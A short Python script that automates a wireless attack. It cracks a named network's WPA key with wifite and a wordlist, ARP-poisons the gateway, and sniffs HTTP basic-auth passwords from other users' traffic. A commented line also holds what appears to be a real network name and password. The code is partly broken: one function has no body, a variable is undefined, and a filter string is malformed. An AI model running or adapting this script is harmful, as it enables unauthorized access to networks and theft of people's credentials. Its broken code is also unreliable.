import os
import subprocess
import sys

INTERFACE_NAME = "wlan0"
WIFITE_PASSWORDS_FILE = "cracked.txt"
DICT_FILE = "dict.txt"

def setup():
    os.system("rm *.cap")
    os.system("rm {}".format(WIFITE_PASSWORDS_FILE))

def crackWPA(essid, dictFile):
    subprocess.Popen(["wifite", "-i", INTERFACE_NAME, "--no-wps", "-e", essid, "--verbose", "--wpa", "--dict", dictFile]).wait()
    with open(WIFITE_PASSWORDS_FILE, "r") as passwords:
        for line in passwords.readlines():
            if '"key":' in line:
                print(line.split()[-1][1:-2])
                return line.split()[-1][1:-2]

def connectToNetwork(essid, password):
    # subprocess.Popen(["nmcli", "d", "wifi", "connect", essid, "password", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()
    # input("")
    # print("connecting to network")
    # os.system("sudo ifconfig {} down".format(INTERFACE_NAME))
    # os.system("sudo iwconfig {} mode managed".format(INTERFACE_NAME))
    # os.system("sudo ifconfig {} up".format(INTERFACE_NAME))
    #os.system("sudo nmcli d wifi connect Vic password praetorian")
    #subprocess.Popen(["sudo", "nmcli", "d", "wifi", "connect", essid, "password", password]).wait()

def getGatewayIP():
    with subprocess.Popen(["ip", "route"], stdout=subprocess.PIPE) as proc:
        out, _ = proc.communicate()
        for line in out.decode().split('\n'):
            if line.split()[0] == "default":
                return line.split()[2]
        raise Exception("Gateway IP not found.")

def arpPoison(interface_name, host):
    arpSpoofProc = subprocess.Popen(["arpspoof", "-i", interface_name, host], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return arpSpoofProc

def sniffPasswords():
    return subprocess.Popen(["tshark", "-ni", INTERFACE_NAME, "-T", "fields", "-e", "http.authbasic", "-Y", '"http.authbasic'])

if __name__ == "__main__":
    setup()
    essid = input("Enter the name of the network you'd like to attack:")
    password = crackWPA(essid, DICT_FILE)
    input("Password found! Connect to '{}' with password '{}' and press enter when ready".format(essid, password))
    # connectToNetwork(essid, password)
    print("ARP Poisoning...")
    gatewayIP = getGatewayIP()
    arpSpoofProc = arpPoison(monitorModeInterface, gatewayIP)
    print("Sniffing passwords...")
    sniffProc = sniffPasswords()
    input("Press enter to stop sniffing")
    sniffProc.terminate()
    arpSpoofProc.terminate()